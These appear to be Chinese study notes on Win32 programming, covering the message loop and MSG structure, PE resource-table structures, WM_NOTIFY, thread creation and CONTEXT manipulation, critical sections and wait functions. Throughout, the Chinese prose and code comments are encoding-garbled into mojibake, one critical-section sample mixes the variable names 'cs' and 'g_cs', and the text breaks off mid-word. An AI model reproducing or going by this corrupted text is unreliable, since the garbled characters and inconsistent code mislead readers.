Windowsä¸­çš„äº‹ä»¶æ˜¯ä¸€ä¸ªâ€œåŠ¨ä½œâ€ï¼Œè¿™ä¸ªåŠ¨ä½œå¯èƒ½æ˜¯ç”¨æˆ·æ“ä½œåº”ç”¨ç¨‹åºäº§ç”Ÿçš„ï¼Œä¹Ÿå¯èƒ½æ˜¯Windowsè‡ªå·±äº§ç”Ÿçš„ã€‚è€Œæ¶ˆæ¯ï¼Œå°±æ˜¯ç”¨æ¥æè¿°è¿™äº›â€œåŠ¨ä½œâ€çš„ï¼Œæ¯”å¦‚ï¼šè¿™ä¸ªåŠ¨ä½œæ˜¯ä»€ä¹ˆæ—¶å€™äº§ç”Ÿçš„ï¼Ÿå“ªä¸ªåº”ç”¨ç¨‹åºäº§ç”Ÿçš„ï¼Ÿåœ¨ä»€ä¹ˆä½ç½®äº§ç”Ÿçš„ï¼Ÿç­‰ç­‰â€¦â€¦\nWindowsä¸ºäº†èƒ½å¤Ÿå‡†ç¡®çš„æè¿°è¿™äº›ä¿¡æ¯ï¼Œæä¾›äº†ä¸€ä¸ªç»“æ„ä½“ï¼šMSGï¼Œè¯¥ç»“æ„ä½“é‡Œé¢è®°å½•çš„äº‹ä»¶çš„è¯¦ç»†ä¿¡æ¯\ntypedef struct tagMSG { HWND hwnd; //è¡¨ç¤ºæ¶ˆæ¯æ‰€å±çš„çª—å£ï¼Œä¸€ä¸ªæ¶ˆæ¯ä¸€èˆ¬éƒ½æ˜¯ä¸æŸä¸ªçª—å£ç›¸å…³è”çš„ï¼Œåœ¨Windowsä¸­HWNDç±»å‹çš„å˜é‡é€šå¸¸ç”¨æ¥æ ‡è¯†çª—å£ã€‚ UINT message; //åœ¨Windowsä¸­ï¼Œæ¶ˆæ¯æ˜¯ç”±ä¸€ä¸ªæ•°å€¼æ¥è¡¨ç¤ºçš„ï¼Œä½†æ˜¯ç”±äºæ•°å€¼ä¸ä¾¿äºè®°å¿†ï¼Œæ‰€ä»¥Windowså°†æ¶ˆæ¯å¯¹åº”çš„æ•°å€¼å®šä¹‰ä¸ºWM_XXXå®ï¼ˆWM == Window Messageï¼‰æ¯”å¦‚ï¼šé¼ æ ‡å·¦é”®æŒ‰ä¸‹-\u003eWM_LBUTTONDOWN é”®ç›˜æŒ‰ä¸‹-\u003eWM_KEYDOWN WPARAM wParam; //32ä½æ¶ˆæ¯çš„ç‰¹å®šé™„åŠ ä¿¡æ¯,å…·ä½“è¡¨ç¤ºä»€ä¹ˆå¤„å†³äºmessage LPARAM lParam; //ä¸ä¸Šä¸€ä¸ªä¸€æ · DWORD time; //æ¶ˆæ¯åˆ›å»ºæ—¶çš„æ—¶é—´ POINT pt; //æ¶ˆæ¯åˆ›å»ºæ—¶çš„é¼ æ ‡ä½ç½®(xè½´ä¸yè½´) } MSG, *PMSG; å®Œæ•´çš„ä¸€ä¸ªæ¶ˆæ¯æµç¨‹\ngraph TB A[ç³»ç»Ÿ/ç”¨æˆ·è§¦å‘çš„æŸä¸ªåŠ¨ä½œ--\u003eäº‹ä»¶] --\u003e B[ç³»ç»Ÿå°†è¿™äº›ä¿¡æ¯å­˜å‚¨åˆ°MSGç»“æ„ä½“ä¸­--\u003eæ¶ˆæ¯]; B --\u003e C[ç³»ç»Ÿå°†è¯¥æ¶ˆæ¯å­˜å‚¨åˆ°ç›¸å…³åº”ç”¨ç¨‹åºçš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­--\u003eæ¶ˆæ¯é˜Ÿåˆ—]; C --\u003e D[å¾ªç¯å¼€å§‹--\u003eä»é˜Ÿåˆ—ä¸­å¾ªç¯è·å–æ¶ˆæ¯]; D --\u003e H{GetMessageï¼ˆ\u0026Msg,NULL,0,0ï¼‰?}; H -- æ˜¯ (Yes) --\u003e I[TranslateMessageï¼ˆ\u0026Msgï¼‰//ç¿»è¯‘æ¶ˆæ¯]; I --\u003e J[DispatchMessageï¼ˆ\u0026Msgï¼‰//æ´¾å‘æ¶ˆæ¯]; J --\u003e D; H -- å¦ (No) --\u003e K[å¾ªç¯ç»“æŸ]; K --\u003e E[DispatchMessageå°†åŠ å·¥è¿‡çš„æ¶ˆæ¯ä¼ é€’ç»™æ“ä½œç³»ç»Ÿ]; E --\u003e F[ç³»ç»Ÿè°ƒç”¨çª—å£è¿‡ç¨‹å‡½æ•°]; F --\u003e G{WindowProcå‡½æ•° //çª—å£è¿‡ç¨‹å‡½æ•°}; ç³»ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ä¸åº”ç”¨ç¨‹åºæ¶ˆæ¯é˜Ÿåˆ—ï¼š\nå…¶å®æ•´ä½“çš„è¿‡ç¨‹å°±æ˜¯ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯ï¼Œåˆ¤æ–­æ¶ˆæ¯æ˜¯ä¸æ˜¯æˆ‘å…³ç³»çš„æ¶ˆæ¯ã€‚å¦‚æœæ˜¯å°±å¤„ç†æ¶ˆæ¯ï¼›å¦‚æœä¸æ˜¯å°±è®©ç³»ç»Ÿå»å¤„ç†æ¶ˆæ¯\nå­çª—å£-æ¶ˆæ¯å¤„ç†å‡½æ•° æŒ‰é’®äº‹ä»¶çš„å¤„ç†ï¼š\næŒ‰é’®çš„WNDCLASSä¸æ˜¯æˆ‘ä»¬å®šä¹‰çš„ï¼Œæ˜¯ç³»ç»Ÿé¢„å®šä¹‰å¥½çš„ã€‚\nå›è°ƒå‡½æ•°çš„ç»“æ„\nLRESULT CALLBACK WindowProc( IN HWND hwnd, IN UINT uMsg, IN WPARAM wParam, IN LPARAM lParam ); å›è°ƒå‡½æ•°çš„å †æ ˆ\nerDiagram stack { ESP return_address ESP_4 hwnd ESP_8 uMsg ESP_c wParam ESP_10 lParam } æ€»ç»“ï¼š\næŒ‰é’®æ˜¯ä¸€ç§ç‰¹æ®Šçš„çª—ä½“ï¼Œå¹¶ä¸éœ€è¦æä¾›å•ç‹¬çš„çª—å£å›è°ƒå‡½æ•°\nå½“æŒ‰é’®æœ‰äº‹ä»¶äº§ç”Ÿæ—¶ï¼Œä¼šç»™çˆ¶çª—å£æ¶ˆæ¯å¤„ç†ç¨‹åºå‘é€ä¸€ä¸ªWM_COMMANDæ¶ˆæ¯\ngraph TB A[æŒ‰é’®] --å•å‡»æŒ‰é’®--\u003e B[ç³»ç»Ÿæä¾›WinProc]; B --è½¬æ¢WM_COMMAND--\u003e C[çˆ¶çª—å£çš„WinProc]; èµ„æºè¡¨ï¼ˆPEï¼‰ èµ„æºç›®å½•ï¼ˆå›¾ä¸­ç»¿è‰²çš„ï¼‰ï¼š\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics;\t//èµ„æºå±æ€§ ä¿ç•™ 0 DWORD TimeDateStamp;\t//èµ„æºåˆ›å»ºçš„æ—¶é—´ WORD MajorVersion;\t//èµ„æºç‰ˆæœ¬å· æœªä½¿ç”¨ 0 WORD MinorVersion;\t//èµ„æºç‰ˆæœ¬å· æœªä½¿ç”¨ 0 WORD NumberOfNamedEntries;\t//ä»¥åç§°å‘½åçš„èµ„æºæ•°é‡ WORD NumberOfIdEntries;\t//ä»¥IDå‘½åçš„èµ„æºæ•°é‡ // IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; èµ„æºç›®å½•é¡¹ï¼ˆå›¾ä¸­é»„è‰²çš„ï¼‰ï¼š\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union {\t//ç›®å½•é¡¹çš„åç§°ã€æˆ–è€…ID struct { DWORD NameOffset:31; //ä½31ä½ DWORD NameIsString:1; //æœ€é«˜1ä½ }; DWORD Name; //åœ¨ç¬¬ä¸€å±‚ä¸­ä»£è¡¨å…‰æ ‡ï¼Œä½å›¾ç­‰16ç§é¢„å®šä¹‰ç±»å‹ã€‚è€Œåœ¨ç¬¬äºŒå±‚ä»£è¡¨èµ„æºç¼–å· WORD Id; }; union { DWORD OffsetToData;\t//ç›®å½•é¡¹æŒ‡é’ˆ struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; }; }; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; OffsetToDataçš„å«ä¹‰ï¼š\næœ€é«˜ä½å¦‚æœä¸º1ï¼šä½31ä½ + èµ„æºåœ°å€ == ä¸‹ä¸€å±‚ç›®å½•èŠ‚ç‚¹çš„èµ·å§‹ä½ç½® æœ€é«˜ä½å¦‚æœä¸º0ï¼ŒæŒ‡å‘IMAGE_RESOURCE_DATA_ENTRY ç¬¬ä¸€å±‚ã€ç¬¬äºŒå±‚å…¨ä¸º1ï¼Œç¬¬ä¸‰å±‚ä¸º0 åœ¨Nameçš„unionä¸­\nå½“æœ€é«˜ä½æ˜¯1æ—¶ï¼Œä½31ä½æ˜¯ä¸€ä¸ªUNICODEæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªç»“æ„ï¼š\ntypedef struct _IMAGE_RESOURCE_DIR_STRING_U { WORD Length; WCHAR NameString[ 1 ]; } IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U; å½“æœ€é«˜ä½æ˜¯0æ—¶ï¼Œè¡¨ç¤ºå­—æ®µçš„å€¼ä½œä¸ºIDä½¿ç”¨\næ•°æ®é¡¹ï¼ˆå›¾ä¸­æ©™è‰²çš„ï¼‰ï¼š\ntypedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å…¶ä¸­ï¼Œç®€ä½“ä¸­æ–‡ï¼š2052\nWM_NOTIFY æ¦‚è¿°ï¼š\nè¯¥æ¶ˆæ¯ç±»å‹ä¸WM_COMMANDç±»å‹ç›¸ä¼¼ï¼Œéƒ½æ˜¯ç”±å­çª—å£å‘çˆ¶çª—å£å‘é€çš„æ¶ˆæ¯ã€‚ WM_NOTIFYå¯ä»¥åŒ…å«æ¯”WM_COMMANDæ›´ä¸°å¯Œçš„ä¿¡æ¯ã€‚ Windowsé€šç”¨ç»„ä»¶ä¸­æœ‰å¾ˆå¤šæ¶ˆæ¯ï¼Œéƒ½æ˜¯é€šè¿‡WM_NOTIFYæ¥æè¿°çš„ã€‚ WM_NOTIFYæ¶ˆæ¯ä¸­çš„å‚æ•°å¦‚ä¸‹ï¼š\nwParamï¼šæ§ä»¶ID\nlParamï¼šæŒ‡å‘ä¸€ä¸ªç»“æ„ï¼š\ntypedef struct tagNMHDR { HWND hwndFrom; //å‘é€é€šçŸ¥æ¶ˆæ¯çš„æ§åˆ¶çª—å£å¥æŸ„ UINT idFrom; //å‘é€é€šçŸ¥æ¶ˆæ¯çš„æ§åˆ¶IDå€¼ UINT code; //é€šçŸ¥ç ï¼Œå¦‚LVM_SELCHANGED } NMHDR; è¿™ä¸ªç»“æ„ä½“èƒ½æ»¡è¶³ä¸€èˆ¬çš„è¦æ±‚ï¼Œä½†èƒ½æè¿°çš„ä¿¡æ¯è¿˜æ˜¯æœ‰é™çš„\nè§£å†³æ–¹æ¡ˆï¼šå¯¹æ¯ç§ä¸åŒç”¨é€”çš„é€šçŸ¥æ¶ˆæ¯éƒ½å®šä¹‰å¦ä¸€ç§ç»“æ„æ¥è¡¨ç¤º\ntypedef struct tagNMLVCACHEHINT { NMHDR hdr; int iFrom; int iTo; } NMLVCACHEHINT, *PNMLVCACHEHINT; typedef struct tagLVDISPINFO { NMHDR hdr; LVITEM item; } NMLVDISPINFO, FAR *LPNMLVDISPINFO; typedef struct _NMLVFINDITEM { NMHDR hdr; int iStart; LVFINDINFO lvfi; } NMLVFINDITEM, *PNMLVFINDITEM; çº¿ç¨‹ çº¿ç¨‹æ˜¯ç”±Windowså†…æ ¸è´Ÿè´£åˆ›å»ºä¸ç®¡ç†çš„ï¼Œå¥æŸ„ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæœ‰äº†è¿™ä¸ªä»¤ç‰Œå°±å¯ä»¥ä½¿ç”¨çº¿ç¨‹å¯¹è±¡ã€‚\nçº¿ç¨‹IDæ˜¯èº«ä»½è¯ï¼Œå”¯ä¸€çš„ï¼Œç³»ç»Ÿè¿›è¡Œçº¿ç¨‹è°ƒåº¦çš„æ—¶å€™è¦ä½¿ç”¨çš„\nåˆ›å»ºçº¿ç¨‹ï¼š\nHANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // å®‰å…¨å±æ€§ é€šå¸¸ä¸ºNULL SIZE_T dwStackSize, // å‚æ•°ç”¨äºè®¾å®šçº¿ç¨‹å¯ä»¥å°†å¤šå°‘åœ°å€ç©ºé—´ç”¨äºå®ƒè‡ªå·±çš„å †æ ˆï¼Œæ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰å®ƒè‡ªå·±çš„å †æ ˆ LPTHREAD_START_ROUTINE lpStartAddress, // å‚æ•°ç”¨äºæŒ‡æ˜æƒ³è¦æ–°çº¿ç¨‹æ‰§è¡Œçš„çº¿ç¨‹å‡½æ•°çš„åœ°å€ LPVOID lpParameter, // çº¿ç¨‹å‡½æ•°çš„å‚æ•°ï¼Œåœ¨çº¿ç¨‹å¯åŠ¨æ‰§è¡Œæ—¶å°†è¯¥å‚æ•°ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°ã€‚æ—¢å¯ä»¥æ˜¯æ•°å­—ï¼Œä¹Ÿå¯ä»¥æ˜¯æŒ‡å‘åŒ…å«å…¶ä»–ä¿¡æ¯çš„ä¸€ä¸ªæ•°æ®ç»“æ„çš„æŒ‡é’ˆ DWORD dwCreationFlags, // 0 åˆ›å»ºå®Œæ¯•ç«‹å³è°ƒåº¦ CREATE_SUSPENDEDåˆ›å»ºåæŒ‚èµ· LPDWORD lpThreadId // çº¿ç¨‹ID ); // è¿”å›å€¼ï¼šçº¿ç¨‹å¥æŸ„ åˆ›å»ºçº¿ç¨‹ä»£ç ï¼š\nDWORD WINAPI ThreadProc( LPVOID lpParameter // thread data ) //åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹ HANDLE hThread = ::CreateThread(NULL, 0, ThreadProc,NULL, 0, NULL); //å¦‚æœä¸åœ¨å…¶ä»–çš„åœ°æ–¹å¼•ç”¨å®ƒ å…³é—­å¥æŸ„ ::CloseHandle(hThread); å‘çº¿ç¨‹å‡½æ•°ä¼ é€’å˜é‡çš„ä¸¤ç§æ–¹å¼ï¼š\nå…¨å±€å˜é‡ çº¿ç¨‹å‚æ•° çº¿ç¨‹æ§åˆ¶ æ¯ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œçš„æ—¶å€™ï¼Œéƒ½ä¼šç‹¬è‡ªå ç”¨ä¸€ä¸ªCPUï¼Œå½“ç³»ç»Ÿä¸­çš„çº¿ç¨‹æ•°é‡ \u003e CPUçš„æ•°é‡æ—¶ï¼Œå°±ä¼šå­˜åœ¨å¤šä¸ªçº¿ç¨‹å…±ç”¨ä¸€ä¸ªCPUçš„æƒ…å†µã€‚ä½†CPUæ¯æ¬¡åªèƒ½è¿è¡Œä¸€ä¸ªçº¿ç¨‹ï¼ŒWindowsæ¯éš”20æ¯«ç§’ä¼šè¿›è¡Œçº¿ç¨‹çš„åˆ‡æ¢ï¼Œé‚£æ¯”å¦‚çº¿ç¨‹Aæ‰§è¡Œåˆ°åœ°å€ï¼š0x2345678 eax:1 ecx:2 edx:3 ebx:4...è¿˜æœ‰eflagæ ‡å¿—å¯„å­˜å™¨ä¸­çš„å€¼ç­‰ç­‰â€¦ æ­¤æ—¶ï¼Œçº¿ç¨‹æ‰§è¡Œæ—¶é—´åˆ°äº†ï¼Œè¢«åˆ‡æ¢åˆ°äº†çº¿ç¨‹B...å½“çº¿ç¨‹Bçš„æ—¶é—´ç‰‡ä¹Ÿåˆ°äº†ï¼Œå†åˆ‡æ¢ä¼šçº¿ç¨‹Aæ—¶ï¼Œç³»ç»Ÿæ˜¯å¦‚ä½•çŸ¥é“è¯¥ä»å“ªä¸ªåœ°å€å¼€å§‹æ‰§è¡Œå‘¢ï¼Ÿè¢«åˆ‡æ¢å‰ç”¨åˆ°çš„å„ç§å¯„å­˜å™¨çš„å€¼è¯¥å¦‚ä½•æ¢å¤å‘¢ï¼Ÿ\næœ‰ä¸€ä¸ªstruct _CONTEXTç»“æ„ï¼Œè¯¥ç»“æ„åŒ…å«äº†ç‰¹å®šå¤„ç†å™¨çš„å¯„å­˜å™¨æ•°æ®ã€‚\ntypedef struct _CONTEXT { // // The flags values within this flag control the contents of // a CONTEXT record. // // If the context record is used as an input parameter, then // for each portion of the context record controlled by a flag // whose value is set, it is assumed that that portion of the // context record contains valid context. If the context record // is being used to modify a threads context, then only that // portion of the threads context will be modified. // // If the context record is used as an IN OUT parameter to capture // the context of a thread, then only those portions of the thread's // context corresponding to set flags will be returned. // // The context record is never used as an OUT only parameter. // DWORD ContextFlags; // // This section is specified/returned if CONTEXT_DEBUG_REGISTERS is // set in ContextFlags. Note that CONTEXT_DEBUG_REGISTERS is NOT // included in CONTEXT_FULL. // DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_FLOATING_POINT. // FLOATING_SAVE_AREA FloatSave; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_SEGMENTS. // DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_INTEGER. // DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; // // This section is specified/returned if the // ContextFlags word contians the flag CONTEXT_CONTROL. // DWORD Ebp; DWORD Eip; DWORD SegCs; // MUST BE SANITIZED DWORD EFlags; // MUST BE SANITIZED DWORD Esp; DWORD SegSs; // // This section is specified/returned if the ContextFlags word // contains the flag CONTEXT_EXTENDED_REGISTERS. // The format and contexts are processor specific // BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION]; } CONTEXT; è·å–çº¿ç¨‹CONTEXTç»“æ„ï¼š\n//æŒ‚èµ·çº¿ç¨‹ SuspendThread(çº¿ç¨‹å¥æŸ„); CONTEXT context //è®¾ç½®è¦è·å–çš„ç±»å‹ context.ContextFlags = CONTEXT_CONTROL; //è·å–\tBOOL ok = ::GetThreadContext(hThread,\u0026context); //è®¾ç½® context.Eip = 0x401000; SetThreadContext(hThread,\u0026context);\tå‡½æ•°ï¼š\næŒ‚èµ·çº¿ç¨‹ï¼š::SuspendThread(hThread);\næ¢å¤çº¿ç¨‹ï¼š::ResumeThread(hThread);\nç»ˆæ­¢çº¿ç¨‹ï¼š\n::ExitThread(DWORD dwExitCode);\nçº¿ç¨‹å‡½æ•°è¿”å›\n::TerminateThread(hThread,2);\n::WaitForSingleObject(hThread,INFINITE);\nExitThreadä¸TerminateThreadçš„åŒºåˆ«\n::ExitThread(DWORD dwExitCode);æ˜¯åŒæ­¥è°ƒç”¨ï¼Œå°±æ˜¯æ‰§è¡Œåˆ°å®ƒå°±é€€å‡ºï¼Œä¹‹åçš„ä»£ç å°±ä¸ä¼šæ‰§è¡Œäº†ï¼›::TerminateThread(hThread,2);æ˜¯å¼‚æ­¥è°ƒç”¨ï¼Œåé¢éœ€è¦::WaitForSingleObject(hThread,INFINITE);æ¥åˆ¤æ–­å®ƒæ˜¯å¦é€€å‡ºäº†ã€‚ ExitThreadæ‰§è¡Œå®Œåé‡Šæ”¾å †æ ˆï¼Œè€ŒTerminateThreadæ‰§è¡Œä¸ä¼šé‡Šæ”¾å †æ ˆã€‚ åˆ¤æ–­çº¿ç¨‹æ˜¯å¦ç»“æŸ\nBOOL GetExitCodeThread( HANDLE hThread, //è¦ç»“æŸçš„çº¿ç¨‹å¥æŸ„ LPDWORD lpExitCode //æŒ‡å®šçº¿ç¨‹çš„é€€å‡ºä»£ç ã€‚å¯ä»¥é€šè¿‡GetExitCodeThreadæ¥æŸ¥çœ‹ä¸€ä¸ªçº¿ç¨‹çš„é€€å‡ºä»£ç  ); ä¸´ç•ŒåŒº å¤šçº¿ç¨‹è®¿é—®å…¨å±€å˜é‡äº§ç”Ÿé—®é¢˜çš„åŸå› ï¼š\nå‡è®¾æœ‰ä¸€ä¸ªå…¬å…±çš„ç™½æ¿ï¼Œä¸Šé¢å†™ç€ä¸€ä¸ªæ•°å­—ï¼Œæ¯”å¦‚ â€œ0â€ã€‚ ç°åœ¨æœ‰ä¸¤ä¸ªå°æœ‹å‹ï¼Œå°æ˜å’Œå°çº¢ï¼Œä»–ä»¬éƒ½æƒ³è½®æµåœ¨è¿™ä¸ªç™½æ¿ä¸ŠæŠŠæ•°å­—åŠ  1ï¼Œå¹¶ä¸”æ¯ä¸ªäººéƒ½è¦åŠ  10000 æ¬¡ã€‚ æˆ‘ä»¬å¸Œæœ›æœ€ç»ˆç™½æ¿ä¸Šçš„æ•°å­—æ˜¯ 20000ã€‚\nå°æ˜æƒ³åŠ  1ï¼š å°æ˜èµ°åˆ°ç™½æ¿å‰ï¼Œçœ‹åˆ°ä¸Šé¢å†™ç€ â€œ0â€ï¼Œå¿ƒé‡Œè®°ä½äº† â€œç°åœ¨æ˜¯ 0â€ã€‚ å°çº¢ä¹Ÿæƒ³åŠ  1ï¼š å‡ ä¹åŒæ—¶ï¼Œå°çº¢ä¹Ÿèµ°åˆ°ç™½æ¿å‰ï¼Œä¹Ÿçœ‹åˆ°äº†ä¸Šé¢å†™ç€ â€œ0â€ï¼Œå¥¹ä¹Ÿè®°ä½äº† â€œç°åœ¨æ˜¯ 0â€ã€‚ å°æ˜å†™ä¸‹æ–°æ•°å­—ï¼š å°æ˜å¿ƒç®—äº†ä¸€ä¸‹ 0 + 1 = 1ï¼Œç„¶åæ‹¿èµ·ç¬”ï¼ŒæŠŠç™½æ¿ä¸Šçš„ â€œ0â€ æ“¦æ‰ï¼Œå†™ä¸Šäº† â€œ1â€ã€‚ å°çº¢ä¹Ÿå†™ä¸‹æ–°æ•°å­—ï¼š å°çº¢ä¹Ÿå¿ƒç®—äº†ä¸€ä¸‹ 0 + 1 = 1 ï¼ˆæ³¨æ„ï¼Œå¥¹çœ‹åˆ°çš„æ˜¯ä¹‹å‰çš„ â€œ0\"ï¼Œè€Œä¸æ˜¯å°æ˜åˆšå†™çš„ â€œ1\"ï¼‰ï¼Œç„¶åå¥¹ä¹Ÿæ‹¿èµ·ç¬”ï¼ŒæŠŠç™½æ¿ä¸Šçš„ â€œ0â€ ï¼ˆå¦‚æœè¿˜æ²¡è¢«æ“¦æ‰ï¼‰æˆ–è€… â€œ1â€ ï¼ˆå¦‚æœå·²ç»è¢«å°æ˜å†™ä¸Šäº†ï¼Œä½†æ˜¯å°çº¢æ²¡æ³¨æ„åˆ°ï¼‰æ“¦æ‰ï¼Œä¹Ÿå†™ä¸Šäº† â€œ1\"ã€‚ æ€»ç»“ï¼š\nå¤šçº¿ç¨‹è®¿é—®å…¨å±€å˜é‡æ—¶ï¼Œå­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼ˆä¸¤ä¸ªäººï¼‰ å±€éƒ¨å˜é‡ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼ˆä¸¤ä¸ªäººå¿ƒç®—çš„ç»“æœï¼‰ ä¸´ç•ŒåŒºçš„è®¾è®¡æ€è·¯ï¼š\nåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç›¸å½“äºä¸¤ä¸ªäººåªèƒ½ç”¨ä¸€æ”¯ç¬”åœ¨ç™½æ¿ä¸Šå†™ç­”æ¡ˆ\nä»£ç å®ç°ï¼š\n//åˆ›å»ºCRITICAL_SECTIONï¼š CRITICAL_SECTION cs; //åœ¨ä½¿ç”¨å‰è¿›è¡Œåˆå§‹åŒ– InitializeCriticalSection(\u0026cs);\t//åœ¨å‡½æ•°ä¸­ä½¿ç”¨: DWORD WINAPI çº¿ç¨‹A(PVOID pvParam) { EnterCriticalSection(\u0026cs); //å¯¹å…¨å±€éå†Xçš„æ“ä½œ LeaveCriticalSection(\u0026cs); return(0); } DWORD WINAPI çº¿ç¨‹B(PVOID pvParam) { EnterCriticalSection(\u0026g_cs); //å¯¹å…¨å±€éå†Xçš„æ“ä½œ LeaveCriticalSection(\u0026g_cs); return(0); } //åˆ é™¤CRITICAL_SECTION VOID DeleteCriticalSection(PCRITICAL_SECTION pcs); //å½“çº¿ç¨‹ä¸å†è¯•å›¾è®¿é—®å…±äº«èµ„æºæ—¶ CRITICAL_SECTIONç»“æ„\ntypedef struct _RTL_CRITICAL_SECTION { PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; //å®ƒè¢«åˆå§‹åŒ–ä¸ºæ•°å€¼ -1,æ­¤æ•°å€¼ç­‰äºæˆ–å¤§äº 0 æ—¶ï¼Œè¡¨ç¤ºæ­¤ä¸´ç•ŒåŒºè¢«å ç”¨ LONG RecursionCount; //æ­¤å­—æ®µåŒ…å«æ‰€æœ‰è€…çº¿ç¨‹å·²ç»è·å¾—è¯¥ä¸´ç•ŒåŒºçš„æ¬¡æ•° HANDLE OwningThread; //æ­¤å­—æ®µåŒ…å«å½“å‰å ç”¨æ­¤ä¸´ç•ŒåŒºçš„çº¿ç¨‹çš„çº¿ç¨‹æ ‡è¯†ç¬¦,æ­¤çº¿ç¨‹IDä¸GetCurrentThreadIdæ‰€è¿”å›çš„ ID ç›¸åŒ HANDLE LockSemaphore; DWORD SpinCount; } RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; äº’æ–¥ä½“ WaitForSingleObjectå‡½æ•°ï¼š\nç­‰å¾…å‡½æ•°å¯ä½¿çº¿ç¨‹è‡ªæ„¿è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°ä¸€ä¸ªç‰¹å®šçš„å†…æ ¸å¯¹è±¡å˜ä¸ºå·²é€šçŸ¥çŠ¶æ€ä¸ºæ­¢ã€‚\nDWORD WaitForSingleObject( HANDLE hHandle, // å†…æ ¸å¯¹è±¡å¥æŸ„ï¼Œå¯ä»¥æ˜¯è¿›ç¨‹ä¹Ÿå¯ä»¥æ˜¯çº¿ç¨‹ DWORD dwMilliseconds // ç­‰å¾…æ—¶é—´ï¼Œå•ä½æ˜¯æ¯«ç§’INFINITE(-1)ä¸€ç›´ç­‰å¾… ); //è¿”å›å€¼ï¼š //WAIT_OBJECT_0(0)\tç­‰å¾…å¯¹è±¡å˜ä¸ºå·²é€šçŸ¥ //WAIT_TIMEOUT(0x102)\tè¶…æ—¶ WaitForMultipleObjectså‡½æ•°ï¼š\nåŒæ—¶æŸ¥çœ‹è‹¥å¹²ä¸ªå†…æ ¸å¯¹è±¡çš„å·²é€šçŸ¥çŠ¶æ€ã€‚\nDWORD WaitForMultipleObjects( DWORD nCount, // è¦æŸ¥çœ‹å†…æ ¸å¯¹è±¡çš„æ•°é‡ CONST HANDLE *lpHandles, // å†…æ ¸å¯¹è±¡æ•°ç»„ BOOL bWaitAll, // ç­‰åˆ°ç±»å‹ TRUE ç­‰åˆ°æ‰€æœ‰å˜ä¸ºå·²é€šçŸ¥ FALSE åªè¦æœ‰ä¸€ä¸ªå˜ä¸ºå·²é€šçŸ¥ DWORD dwMilliseconds // è¶…æ—¶æ—¶é—´ ); //è¿”å›å€¼ï¼š //bWaitAll\tä¸ºTRUEæ—¶ï¼Œè¿”å›WAIT_OBJECT_0(0)ä»£ç æ‰€ä»¥å†…æ ¸å¯¹è±¡éƒ½å˜æˆå·²é€šçŸ¥ //bWaitAll\tä¸ºFALSEæ—¶ï¼Œè¿”å›æœ€å…ˆå˜æˆå·²é€šçŸ¥çš„å†…æ ¸å¯¹è±¡åœ¨æ•°ç»„ä¸­çš„ç´¢å¼• //WAIT_TIMEOUT(0x102)\tè¶…æ—¶ è¯´æ˜ï¼š\nå†…æ ¸å¯¹è±¡ä¸­çš„æ¯ç§å¯¹è±¡éƒ½å¯ä»¥è¯´æ˜¯å¤„äºå·²é€šçŸ¥æˆ–æœªé€šçŸ¥çš„çŠ¶æ€ä¹‹ä¸­ è¿™ç§çŠ¶æ€çš„åˆ‡æ¢æ˜¯ç”±Microsoftä¸ºæ¯ä¸ªå¯¹è±¡å»ºç«‹çš„ä¸€å¥—è§„åˆ™æ¥å†³å®šçš„ å½“çº¿ç¨‹æ­£åœ¨è¿è¡Œçš„æ—¶å€™ï¼Œçº¿ç¨‹å†…æ ¸å¯¹è±¡å¤„äºæœªé€šçŸ¥çŠ¶æ€ï¼›å½“çº¿ç¨‹ç»ˆæ­¢è¿è¡Œçš„æ—¶å€™ï¼Œå®ƒå°±å˜ä¸ºå·²é€šçŸ¥çŠ¶æ€ åœ¨å†…æ ¸ä¸­å°±æ˜¯ä¸ªBOOLå€¼ï¼Œè¿è¡Œæ—¶FALSEç»“æŸTRUE äº’æ–¥ä½“ä¸ä¸´ç•ŒåŒºçš„åŒºåˆ«ï¼š\nä¸´ç•ŒåŒºåªèƒ½ç”¨äºå•ä¸ªè¿›ç¨‹é—´çš„çº¿ç¨‹æ§åˆ¶ äº’æ–¥ä½“å¯ä»¥è®¾å®šç­‰å¾…è¶…æ—¶ï¼Œä½†ä¸´ç•ŒåŒºä¸èƒ½ çº¿ç¨‹æ„å¤–ç»ˆç»“æ—¶ï¼ŒMutexå¯ä»¥é¿å…æ— é™ç­‰å¾… Mutexæ•ˆç‡æ²¡æœ‰ä¸´ç•ŒåŒºé«˜ äº‹ä»¶ ä»€ä¹ˆæ˜¯å†…æ 